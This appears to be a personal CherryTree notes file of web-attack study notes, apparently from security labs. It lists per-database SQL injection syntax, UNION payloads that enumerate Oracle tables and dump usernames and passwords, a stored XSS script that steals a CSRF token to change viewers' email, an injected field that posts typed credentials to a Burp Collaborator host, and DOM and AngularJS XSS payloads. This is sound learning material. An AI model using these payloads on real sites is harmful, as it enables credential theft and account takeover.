<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="SQL Injection" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601615138" ts_lastsave="1601718116">
    <node name="Querying the database" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601615225" ts_lastsave="1601615232">
      <rich_text justification="left"></rich_text>
      <codebox char_offset="0" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="0">Microsoft, MySQL	SELECT @@version
Oracle	SELECT * FROM v$version
PostgreSQL	SELECT version()</codebox>
    </node>
    <node name="Union attack" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601707227" ts_lastsave="1601707363">
      <rich_text>// Verify the table returns two columns when querying
'+UNION+SELECT+'abc','def'--

</rich_text>
    </node>
    <node name="String Concat" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601707512" ts_lastsave="1601707513">
      <rich_text>
</rich_text>
      <rich_text scale="h2">String concatenation</rich_text>
      <rich_text>
                     You can concatenate together multiple strings to make a single string.         
        </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
</rich_text>
      <table char_offset="131" justification="left" col_min="400" col_max="400">
        <row>
          <cell>Microsoft</cell>
          <cell>'foo'+'bar'</cell>
        </row>
        <row>
          <cell>PostgreSQL</cell>
          <cell>'foo'||'bar'</cell>
        </row>
        <row>
          <cell>MySQL</cell>
          <cell>'foo' 'bar' [Note the space between the two strings]
                    CONCAT('foo','bar')</cell>
        </row>
        <row>
          <cell>Oracle</cell>
          <cell>'foo'||'bar'</cell>
        </row>
      </table>
    </node>
    <node name="Substring" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601707530" ts_lastsave="1601707531">
      <rich_text>
</rich_text>
      <rich_text scale="h2">Substring</rich_text>
      <rich_text>
                     You can extract part of a string, from a specified offset  with a specified length. Note that the offset index is 1-based. Each of  the following expressions will return the string </rich_text>
      <rich_text family="monospace">ba</rich_text>
      <rich_text>.         
        </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
</rich_text>
      <table char_offset="234" justification="left" col_min="400" col_max="400">
        <row>
          <cell>Microsoft</cell>
          <cell>SUBSTRING('foobar', 4, 2)</cell>
        </row>
        <row>
          <cell>PostgreSQL</cell>
          <cell>SUBSTRING('foobar', 4, 2)</cell>
        </row>
        <row>
          <cell>MySQL</cell>
          <cell>SUBSTRING('foobar', 4, 2)</cell>
        </row>
        <row>
          <cell>Oracle</cell>
          <cell>SUBSTR('foobar', 4, 2)</cell>
        </row>
      </table>
    </node>
    <node name="Comments" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601707549" ts_lastsave="1601707550">
      <rich_text>
</rich_text>
      <rich_text scale="h2">Comments</rich_text>
      <rich_text>
                     You can use comments to truncate a query and remove the portion of the original query that follows your input.         
        </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
</rich_text>
      <table char_offset="159" justification="left" col_min="400" col_max="400">
        <row>
          <cell>Microsoft</cell>
          <cell>--comment
                    /*comment*/</cell>
        </row>
        <row>
          <cell>PostgreSQL</cell>
          <cell>--comment
                    /*comment*/</cell>
        </row>
        <row>
          <cell>MySQL</cell>
          <cell>#comment
                    -- comment [Note the space after the double dash]
                    /*comment*/</cell>
        </row>
        <row>
          <cell>Oracle</cell>
          <cell>--comment</cell>
        </row>
      </table>
    </node>
    <node name="Db Version" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601707566" ts_lastsave="1601707567">
      <rich_text>
</rich_text>
      <rich_text scale="h2">Database version</rich_text>
      <rich_text>
                     You can query the database to determine its type and  version. This information is useful when formulating more complicated  attacks.         
        </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
</rich_text>
      <table char_offset="190" justification="left" col_min="400" col_max="400">
        <row>
          <cell>Microsoft</cell>
          <cell>SELECT @@version</cell>
        </row>
        <row>
          <cell>PostgreSQL</cell>
          <cell>SELECT version()</cell>
        </row>
        <row>
          <cell>MySQL</cell>
          <cell>SELECT @@version</cell>
        </row>
        <row>
          <cell>Oracle</cell>
          <cell>SELECT banner FROM v$version
                    SELECT version FROM v$instance</cell>
        </row>
      </table>
    </node>
    <node name="DB contents" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601707622" ts_lastsave="1601707623">
      <rich_text>
</rich_text>
      <rich_text scale="h2">Database contents</rich_text>
      <rich_text>
                     You can list the tables that exist in the database, and the columns that those tables contain.         
        </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
</rich_text>
      <table char_offset="152" justification="left" col_min="400" col_max="400">
        <row>
          <cell>Microsoft</cell>
          <cell>SELECT * FROM information_schema.tables
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</cell>
        </row>
        <row>
          <cell>PostgreSQL</cell>
          <cell>SELECT * FROM information_schema.tables
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</cell>
        </row>
        <row>
          <cell>MySQL</cell>
          <cell>SELECT * FROM information_schema.tables
                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</cell>
        </row>
        <row>
          <cell>Oracle</cell>
          <cell>SELECT * FROM all_tables
                    SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</cell>
        </row>
      </table>
    </node>
    <node name="Oracle list contents" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601708662" ts_lastsave="1601708883">
      <rich_text>//This query below is to list all the tables from the oracle DB

'+UNION+SELECT+</rich_text>
      <rich_text foreground="#ffffffff0000">table_name</rich_text>
      <rich_text>,</rich_text>
      <rich_text foreground="#ffffffff0000">NULL</rich_text>
      <rich_text>+FROM+</rich_text>
      <rich_text foreground="#ffffffff0000">all_tables</rich_text>
      <rich_text>-- 

//To display all the columns from a particular table use the below query 

'+UNION+SELECT+</rich_text>
      <rich_text foreground="#ffffffff0000">column_name</rich_text>
      <rich_text>,</rich_text>
      <rich_text foreground="#ffffffff0000">NULL</rich_text>
      <rich_text>+FROM+</rich_text>
      <rich_text foreground="#ffffffff0000">all_tab_columns</rich_text>
      <rich_text>+WHERE+table_</rich_text>
      <rich_text foreground="#ffffffff0000">name</rich_text>
      <rich_text>='USERS_PFGCGA'--

//This to fetch info from a table using the grabbed column names

'+UNION+SELECT+</rich_text>
      <rich_text foreground="#ffffffff0000">USERNAME_YJHDLP</rich_text>
      <rich_text>,+</rich_text>
      <rich_text foreground="#ffffffff0000">PASSWORD_QDNWSZ</rich_text>
      <rich_text>+FROM+</rich_text>
      <rich_text foreground="#ffffffff0000">USERS_PFGCGA</rich_text>
      <rich_text>--
</rich_text>
    </node>
  </node>
  <node name="Cross Site Scripting" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601718116" ts_lastsave="1601718167">
    <node name="Stored XSS" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601718145" ts_lastsave="1601718749">
      <rich_text>//This exploit is entered in the comment section so who ever views this page will execute JS code
// Whoever views this page their email is automatically been changed to test@test.com

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
This script will make anyone who views the comment issue a POST request to burpcollaborator.net containing their username and password. 

</rich_text>
      <rich_text justification="left"></rich_text>
      <codebox char_offset="185" justification="left" frame_width="815" frame_height="220" width_in_pixels="1" syntax_highlighting="js" highlight_brackets="1" show_line_numbers="1">&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&amp;email=test@test.com')
};
&lt;/script&gt; </codebox>
      <codebox char_offset="325" justification="left" frame_width="755" frame_height="160" width_in_pixels="1" syntax_highlighting="js" highlight_brackets="1" show_line_numbers="1">&lt;input name=username id=username&gt;
&lt;input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"&gt; </codebox>
    </node>
    <node name="Reflected XSS" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601718156" ts_lastsave="1601718156"/>
    <node name="DOM XSS" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601718167" ts_lastsave="1601905620">
      <node name="Payload" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1601905616" ts_lastsave="1601906759">
        <rich_text>Payload 

&lt;img src=1 onload=alert(1) /&gt;

//Angular JS payload
{{constructor.constructor('alert(1)')()}}
</rich_text>
      </node>
    </node>
  </node>
</cherrytree>
